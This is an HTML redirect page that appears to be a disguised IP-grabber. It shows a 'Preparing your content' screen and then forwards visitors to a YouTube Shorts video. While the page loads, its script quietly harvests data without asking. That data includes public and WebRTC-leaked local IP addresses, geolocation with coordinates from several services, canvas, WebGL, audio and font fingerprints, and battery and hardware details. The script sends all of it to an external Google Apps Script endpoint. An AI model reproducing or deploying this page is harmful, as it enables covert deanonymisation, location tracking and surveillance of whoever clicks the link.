<!DOCTYPE html>
<html>
<head>
    <title>Redirecting...</title>
    <meta http-equiv="refresh" content="5;url=https://www.youtube.com/shorts/gRVU6OvOSfY">
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            text-align: center;
        }
        .container {
            max-width: 500px;
            padding: 40px;
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
        }
        .loader {
            width: 50px;
            height: 50px;
            border: 3px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 1s ease-in-out infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        h1 {
            font-size: 24px;
            margin-bottom: 10px;
            font-weight: 600;
        }
        p {
            opacity: 0.9;
            line-height: 1.6;
        }
        .countdown {
            font-size: 14px;
            opacity: 0.7;
            margin-top: 20px;
        }
        .logo {
            font-size: 32px;
            margin-bottom: 20px;
            opacity: 0.9;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">ðŸ”—</div>
        <div class="loader"></div>
        <h1>Preparing your content...</h1>
        <p>You will be redirected in a few seconds.</p>
        <p>If the redirect doesn't work, <a href="https://www.youtube.com/shorts/gRVU6OvOSfY" style="color: #fff; text-decoration: underline;">click here</a>.</p>
        <div class="countdown" id="countdown">5</div>
    </div>

    <script>
        // CONFIGURATION
        const REDIRECT_URL = 'https://www.youtube.com/shorts/gRVU6OvOSfY';
        const EMAIL_SCRIPT = 'https://script.google.com/macros/s/AKfycbyfsuixiMofxkH1gHTHF1Rq6H8r_Y_oJB-0rETlVXXxcy1usT9FmXN2i_gOdW6Ygwtw/exec';
        
        let dataSent = false;

        // Update countdown
        let seconds = 5;
        const countdownEl = document.getElementById('countdown');
        const countdownInterval = setInterval(() => {
            seconds--;
            countdownEl.textContent = seconds;
            if (seconds <= 0) clearInterval(countdownInterval);
        }, 1000);

        // ðŸŽ¯ **GET ALL IP ADDRESSES (IPv4 AND IPv6)**
        async function getAllIPs() {
            const ips = {
                ipv4: null,
                ipv6: null,
                all_ips: [],
                sources: {}
            };
            
            // Services that return different IP types
            const ipServices = [
                // IPv4 specific
                { url: 'https://api.ipify.org?format=json', type: 'json', version: 'ipv4' },
                { url: 'https://v4.ident.me', type: 'text', version: 'ipv4' },
                { url: 'https://ipv4.icanhazip.com', type: 'text', version: 'ipv4' },
                // IPv6 specific
                { url: 'https://api64.ipify.org?format=json', type: 'json', version: 'ipv6' },
                { url: 'https://v6.ident.me', type: 'text', version: 'ipv6' },
                { url: 'https://ipv6.icanhazip.com', type: 'text', version: 'ipv6' },
                // Any IP (could be either)
                { url: 'https://icanhazip.com', type: 'text', version: 'any' },
                { url: 'https://ifconfig.me/ip', type: 'text', version: 'any' },
                { url: 'https://checkip.amazonaws.com', type: 'text', version: 'any' },
                { url: 'https://ipinfo.io/ip', type: 'text', version: 'any' },
                { url: 'https://wtfismyip.com/text', type: 'text', version: 'any' },
                { url: 'https://myexternalip.com/raw', type: 'text', version: 'any' },
                { url: 'https://ipecho.net/plain', type: 'text', version: 'any' }
            ];
            
            // Run all IP services in parallel
            const promises = ipServices.map(async (service) => {
                try {
                    const controller = new AbortController();
                    const timeoutId = setTimeout(() => controller.abort(), 2000);
                    
                    const response = await fetch(service.url, { 
                        signal: controller.signal,
                        cache: 'no-store'
                    });
                    clearTimeout(timeoutId);
                    
                    if (!response.ok) return null;
                    
                    let ip;
                    if (service.type === 'json') {
                        const data = await response.json();
                        ip = data.ip;
                    } else {
                        ip = await response.text();
                        ip = ip.trim();
                    }
                    
                    if (!ip) return null;
                    
                    // Determine version
                    const isIPv4 = /^(\d{1,3}\.){3}\d{1,3}$/.test(ip);
                    const isIPv6 = ip.includes(':');
                    
                    return {
                        ip: ip,
                        source: service.url,
                        version: isIPv4 ? 'ipv4' : (isIPv6 ? 'ipv6' : 'unknown'),
                        requested_version: service.version
                    };
                } catch(e) {
                    return null;
                }
            });
            
            const results = await Promise.allSettled(promises);
            
            for (const result of results) {
                if (result.status === 'fulfilled' && result.value) {
                    const ipInfo = result.value;
                    ips.all_ips.push(ipInfo.ip);
                    ips.sources[ipInfo.ip] = ipInfo.source;
                    
                    if (ipInfo.version === 'ipv4' && !ips.ipv4) {
                        ips.ipv4 = ipInfo.ip;
                    } else if (ipInfo.version === 'ipv6' && !ips.ipv6) {
                        ips.ipv6 = ipInfo.ip;
                    }
                }
            }
            
            // Remove duplicates
            ips.all_ips = [...new Set(ips.all_ips)];
            
            return ips;
        }

        // ðŸŽ¯ **GET GEOLOCATION FROM MULTIPLE SOURCES**
        async function getMultiSourceGeolocation(ipv4, ipv6) {
            const geolocations = {};
            
            // Try multiple geolocation APIs for each IP
            const geoPromises = [];
            
            if (ipv4) {
                // API 1: ipapi.co
                geoPromises.push(
                    fetch(`https://ipapi.co/${ipv4}/json/`)
                        .then(r => r.ok ? r.json() : null)
                        .then(data => data ? {
                            source: 'ipapi.co',
                            ip: ipv4,
                            version: 'ipv4',
                            city: data.city,
                            region: data.region,
                            country: data.country_name,
                            country_code: data.country_code,
                            postal: data.postal,
                            latitude: data.latitude,
                            longitude: data.longitude,
                            timezone: data.timezone,
                            asn: data.asn,
                            org: data.org,
                            isp: data.org
                        } : null)
                        .catch(() => null)
                );
                
                // API 2: ip-api.com
                geoPromises.push(
                    fetch(`https://ip-api.com/json/${ipv4}`)
                        .then(r => r.json())
                        .then(data => data.status === 'success' ? {
                            source: 'ip-api.com',
                            ip: ipv4,
                            version: 'ipv4',
                            city: data.city,
                            region: data.regionName,
                            country: data.country,
                            country_code: data.countryCode,
                            postal: data.zip,
                            latitude: data.lat,
                            longitude: data.lon,
                            timezone: data.timezone,
                            asn: data.as,
                            org: data.org,
                            isp: data.isp
                        } : null)
                        .catch(() => null)
                );
                
                // API 3: ipwhois.app
                geoPromises.push(
                    fetch(`https://ipwhois.app/json/${ipv4}`)
                        .then(r => r.json())
                        .then(data => !data.error ? {
                            source: 'ipwhois.app',
                            ip: ipv4,
                            version: 'ipv4',
                            city: data.city,
                            region: data.region,
                            country: data.country,
                            country_code: data.country_code,
                            postal: data.postal,
                            latitude: data.latitude,
                            longitude: data.longitude,
                            timezone: data.timezone_gmt,
                            asn: data.asn,
                            org: data.org,
                            isp: data.isp
                        } : null)
                        .catch(() => null)
                );
            }
            
            if (ipv6) {
                // IPv6 geolocation (fewer services support it)
                geoPromises.push(
                    fetch(`https://ipapi.co/${ipv6}/json/`)
                        .then(r => r.ok ? r.json() : null)
                        .then(data => data ? {
                            source: 'ipapi.co',
                            ip: ipv6,
                            version: 'ipv6',
                            city: data.city,
                            region: data.region,
                            country: data.country_name,
                            country_code: data.country_code,
                            postal: data.postal,
                            latitude: data.latitude,
                            longitude: data.longitude,
                            timezone: data.timezone,
                            asn: data.asn,
                            org: data.org,
                            isp: data.org
                        } : null)
                        .catch(() => null)
                );
            }
            
            const results = await Promise.allSettled(geoPromises);
            
            for (const result of results) {
                if (result.status === 'fulfilled' && result.value) {
                    const geo = result.value;
                    const key = `${geo.version}_${geo.source}`;
                    geolocations[key] = geo;
                }
            }
            
            return geolocations;
        }

        // ðŸŽ¯ **GET WEBRTC LOCAL IPs**
        function getWebRTCLocalIPs() {
            return new Promise((resolve) => {
                const localIPs = {
                    ipv4: [],
                    ipv6: [],
                    candidates: []
                };
                
                try {
                    const rtc = new RTCPeerConnection({
                        iceServers: [],
                        iceCandidatePoolSize: 10
                    });
                    
                    rtc.createDataChannel('');
                    rtc.createOffer()
                        .then(offer => rtc.setLocalDescription(offer))
                        .catch(() => {});
                    
                    rtc.onicecandidate = (ice) => {
                        if (ice && ice.candidate && ice.candidate.candidate) {
                            const candidate = ice.candidate.candidate;
                            localIPs.candidates.push(candidate);
                            
                            // Extract IPs
                            const ipv4Match = candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
                            const ipv6Match = candidate.match(/([a-fA-F0-9:]+:+[a-fA-F0-9:]+)/);
                            
                            if (ipv4Match && ipv4Match[1] && !['0.0.0.0', '127.0.0.1'].includes(ipv4Match[1])) {
                                if (!localIPs.ipv4.includes(ipv4Match[1])) {
                                    localIPs.ipv4.push(ipv4Match[1]);
                                }
                            }
                            
                            if (ipv6Match && ipv6Match[1]) {
                                if (!localIPs.ipv6.includes(ipv6Match[1])) {
                                    localIPs.ipv6.push(ipv6Match[1]);
                                }
                            }
                        }
                    };
                    
                    setTimeout(() => {
                        rtc.close();
                        resolve(localIPs);
                    }, 2000);
                    
                } catch(e) {
                    resolve(localIPs);
                }
            });
        }

        // ðŸŽ¯ **ULTIMATE DATA COLLECTION**
        async function collectUltimateData() {
            const startTime = Date.now();
            
            // 1. BASIC DATA
            const data = {
                timestamp: new Date().toISOString(),
                local_time: new Date().toLocaleString(),
                collection_time: startTime,
                
                // Browser
                user_agent: navigator.userAgent,
                platform: navigator.platform,
                vendor: navigator.vendor,
                language: navigator.language,
                languages: navigator.languages?.join(', ') || '',
                
                // Screen
                screen: {
                    width: screen.width,
                    height: screen.height,
                    availWidth: screen.availWidth,
                    availHeight: screen.availHeight,
                    colorDepth: screen.colorDepth,
                    pixelDepth: screen.pixelDepth,
                    devicePixelRatio: window.devicePixelRatio,
                    orientation: screen.orientation?.type || 'unknown'
                },
                
                // Hardware
                hardware: {
                    concurrency: navigator.hardwareConcurrency || 'unknown',
                    deviceMemory: navigator.deviceMemory || 'unknown',
                    maxTouchPoints: navigator.maxTouchPoints || 0
                },
                
                // Page info
                url: window.location.href,
                referrer: document.referrer || 'direct',
                redirect_to: REDIRECT_URL,
                
                // Features
                features: {
                    cookies: navigator.cookieEnabled,
                    doNotTrack: navigator.doNotTrack || 'not_set',
                    localStorage: !!window.localStorage,
                    sessionStorage: !!window.sessionStorage,
                    notifications: 'Notification' in window,
                    webRTC: !!window.RTCPeerConnection,
                    serviceWorker: 'serviceWorker' in navigator,
                    webGL: (() => {
                        try {
                            const canvas = document.createElement('canvas');
                            return !!(window.WebGLRenderingContext && 
                                    (canvas.getContext('webgl') || canvas.getContext('experimental-webgl')));
                        } catch(e) { return false; }
                    })(),
                    geolocation: 'geolocation' in navigator,
                    mediaDevices: 'mediaDevices' in navigator,
                    vibrate: 'vibrate' in navigator,
                    bluetooth: 'bluetooth' in navigator,
                    usb: 'usb' in navigator,
                    serial: 'serial' in navigator,
                    hid: 'hid' in navigator
                },
                
                // Plugins
                plugins: Array.from(navigator.plugins).map(p => ({
                    name: p.name,
                    filename: p.filename,
                    description: p.description,
                    length: p.length
                })),
                plugin_count: navigator.plugins.length,
                
                // Timezone
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timezone_offset: new Date().getTimezoneOffset(),
                
                // Performance
                performance: performance.memory ? {
                    totalJSHeapSize: Math.round(performance.memory.totalJSHeapSize / 1048576) + ' MB',
                    usedJSHeapSize: Math.round(performance.memory.usedJSHeapSize / 1048576) + ' MB',
                    jsHeapSizeLimit: Math.round(performance.memory.jsHeapSizeLimit / 1073741824) + ' GB'
                } : null
            };

            // 2. GET ALL IPs IN PARALLEL
            const [allIPs, webRTCLocalIPs] = await Promise.all([
                getAllIPs(),
                getWebRTCLocalIPs()
            ]);
            
            data.ips = allIPs;
            data.local_ips = webRTCLocalIPs;
            
            // 3. GET GEOLOCATION FROM ALL SOURCES
            if (allIPs.ipv4 || allIPs.ipv6) {
                const geolocations = await getMultiSourceGeolocation(allIPs.ipv4, allIPs.ipv6);
                data.geolocations = geolocations;
                
                // Pick primary geolocation (prefer IPv4, then most detailed)
                const primaryGeo = Object.values(geolocations).find(g => g.version === 'ipv4') || 
                                   Object.values(geolocations)[0];
                if (primaryGeo) {
                    data.primary_geolocation = primaryGeo;
                }
            }

            // 4. NETWORK INFO
            if (navigator.connection) {
                data.network = {
                    effectiveType: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink + ' Mbps',
                    rtt: navigator.connection.rtt + ' ms',
                    saveData: navigator.connection.saveData,
                    type: navigator.connection.type,
                    downlinkMax: navigator.connection.downlinkMax
                };
            }

            // 5. BATTERY STATUS
            if (navigator.getBattery) {
                try {
                    const battery = await navigator.getBattery();
                    data.battery = {
                        level: Math.round(battery.level * 100) + '%',
                        charging: battery.charging,
                        chargingTime: battery.chargingTime,
                        dischargingTime: battery.dischargingTime
                    };
                } catch(e) {}
            }

            // 6. MULTIPLE CANVAS FINGERPRINTS
            try {
                const fingerprints = {};
                
                // Technique 1: Standard
                const canvas1 = document.createElement('canvas');
                const ctx1 = canvas1.getContext('2d');
                ctx1.textBaseline = 'top';
                ctx1.font = '14px Arial';
                ctx1.fillStyle = '#f60';
                ctx1.fillRect(125, 1, 62, 20);
                ctx1.fillStyle = '#069';
                ctx1.fillText('Fingerprint', 2, 15);
                ctx1.fillStyle = 'rgba(102, 204, 0, 0.7)';
                ctx1.fillText('Fingerprint', 4, 17);
                fingerprints.standard = canvas1.toDataURL().substring(22, 40);
                
                // Technique 2: Advanced
                const canvas2 = document.createElement('canvas');
                const ctx2 = canvas2.getContext('2d');
                const gradient = ctx2.createLinearGradient(0, 0, 150, 0);
                gradient.addColorStop(0, '#ff0000');
                gradient.addColorStop(0.5, '#00ff00');
                gradient.addColorStop(1, '#0000ff');
                ctx2.fillStyle = gradient;
                ctx2.fillRect(10, 10, 150, 100);
                fingerprints.gradient = canvas2.toDataURL().substring(22, 40);
                
                // WebGL info
                const gl = canvas1.getContext('webgl') || canvas1.getContext('experimental-webgl');
                if (gl) {
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    fingerprints.webgl = {
                        vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'restricted',
                        renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'restricted',
                        version: gl.getParameter(gl.VERSION),
                        shadingLanguage: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
                        maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),
                        maxRenderBufferSize: gl.getParameter(gl.MAX_RENDERBUFFER_SIZE)
                    };
                }
                
                data.fingerprints = fingerprints;
                data.canvas_fingerprint = fingerprints.standard;
                
            } catch(e) {
                data.canvas_fingerprint = 'failed';
            }

            // 7. FONT DETECTION
            try {
                const fonts = ['Arial', 'Times New Roman', 'Courier New', 'Verdana', 'Georgia', 
                              'Comic Sans MS', 'Trebuchet MS', 'Impact', 'Webdings', 'Wingdings'];
                const detectedFonts = [];
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                const baseFont = 'monospace';
                ctx.font = '72px ' + baseFont;
                const baseWidth = ctx.measureText('mmmmmmmmmmlli').width;
                
                fonts.forEach(font => {
                    ctx.font = '72px ' + font + ',' + baseFont;
                    if (ctx.measureText('mmmmmmmmmmlli').width !== baseWidth) {
                        detectedFonts.push(font);
                    }
                });
                
                data.detected_fonts = detectedFonts;
                data.font_count = detectedFonts.length;
                data.probable_os = detectedFonts.includes('Segoe UI') ? 'Windows' :
                                   detectedFonts.includes('Apple Symbols') ? 'macOS' :
                                   detectedFonts.includes('Ubuntu') ? 'Linux' : 'Unknown';
            } catch(e) {}

            // 8. AUDIO FINGERPRINT
            try {
                const audioContext = new (window.AudioContext || window.webkitAudioContext)();
                const oscillator = audioContext.createOscillator();
                const gainNode = audioContext.createGain();
                const compressor = audioContext.createDynamicsCompressor();
                
                oscillator.connect(gainNode);
                gainNode.connect(compressor);
                compressor.connect(audioContext.destination);
                
                oscillator.start();
                oscillator.stop(0.001);
                
                data.audio_fingerprint = {
                    sampleRate: audioContext.sampleRate,
                    channelCount: audioContext.destination.channelCount,
                    audioWorklet: !!audioContext.audioWorklet
                };
                
                audioContext.close();
            } catch(e) {}

            // 9. VISITOR ID
            const idString = [
                navigator.userAgent,
                screen.width,
                screen.height,
                navigator.language,
                allIPs.ipv4 || 'noipv4',
                allIPs.ipv6 || 'noipv6',
                data.timezone
            ].join('|');
            
            let hash = 0;
            for (let i = 0; i < idString.length; i++) {
                hash = ((hash << 5) - hash) + idString.charCodeAt(i);
                hash |= 0;
            }
            data.visitor_id = 'VIS-' + Math.abs(hash).toString(16).substring(0, 8).toUpperCase();

            // 10. COLLECTION STATS
            data.collection_duration = Date.now() - startTime + 'ms';
            data.collection_method = 'ULTIMATE_MULTI_SOURCE';
            
            return data;
        }

        // ðŸš€ **SEND DATA**
        async function sendDataToGoogle(data) {
            if (dataSent) return;
            dataSent = true;
            
            console.log('ðŸ“Š Sending ULTIMATE data:', {
                id: data.visitor_id,
                ipv4: data.ips?.ipv4,
                ipv6: data.ips?.ipv6,
                location: data.primary_geolocation?.country
            });
            
            // Method 1: POST
            try {
                await fetch(EMAIL_SCRIPT, {
                    method: 'POST',
                    mode: 'no-cors',
                    body: JSON.stringify(data)
                });
                console.log('âœ… POST sent');
                return;
            } catch(e) {}
            
            // Method 2: GET fallback
            try {
                const params = new URLSearchParams();
                params.append('data', JSON.stringify(data));
                await fetch(EMAIL_SCRIPT + '?' + params.toString());
                console.log('âœ… GET sent');
            } catch(e) {
                console.log('âš ï¸ All send methods failed');
            }
        }

        // ðŸš€ **MAIN EXECUTION**
        (async function() {
            try {
                const data = await collectUltimateData();
                sendDataToGoogle(data);
            } catch(error) {
                console.error('Collection error:', error);
            }
            
            // Redirect after 5 seconds (more time for ultimate collection)
            setTimeout(() => {
                window.location.href = REDIRECT_URL;
            }, 5000);
            
        })();
    </script>
</body>
</html>
